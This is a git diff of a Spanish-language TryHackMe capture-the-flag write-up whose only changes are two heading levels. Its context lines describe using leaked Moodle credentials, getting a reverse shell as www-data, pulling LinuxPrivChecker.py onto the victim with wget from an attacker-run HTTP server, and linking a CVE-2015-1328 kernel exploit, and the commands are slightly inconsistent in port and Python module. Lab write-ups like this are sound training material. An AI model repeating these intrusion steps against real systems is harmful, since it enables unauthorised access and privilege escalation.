@@ -159,7 +159,7 @@ Since you're a Linux user just point this servers IP to severnaya-station.com in
 
 Ejecutamos la configuracion en /etc/hosts acorde y tenemos acceso a una plataforma *moodle*
 
-# Phase 3: Moodle
+## Phase 3: Moodle
 
 Tenemos entonces `xenia:RCP90rulez!` y la url configurada severnaya-station.com/gnocertdir. La exploramos y llegamos a sus mensajes 
 
@@ -209,7 +209,7 @@ Luego nos basta con crear un post y probar su ortografia para que el servidor in
 
 A esta altura deberiamos recibir nuestra conexion remota y tener acceso al shell con usuario www-data.
 
-# Phase 5: Root
+## Phase 5: Root
 TryHackMe nos continua guiando, sugiere descargar el script [LinuxPrivChecker.py](https://gist.github.com/sh1n0b1/e2e1a5f63fbec3706123) , el cual fue muy util para determinar que habia en la computadora.
  
 Para eso creamos un simple http server con python3 (`python3 -m SimpleHTTPServer 1337`) y lo descargamos con la maquina victima utilizando (`wget ip:8000/linuxprivchecker.py`). Lo ejecutamos y podemos ver la version del kernell 3.13.0-32-generic. Esta es vulnerable a **CVE-2015-1328**, y el mismo tryhackme nos brinda el enlace a su exploit: https://www.exploit-db.com/exploits/37292
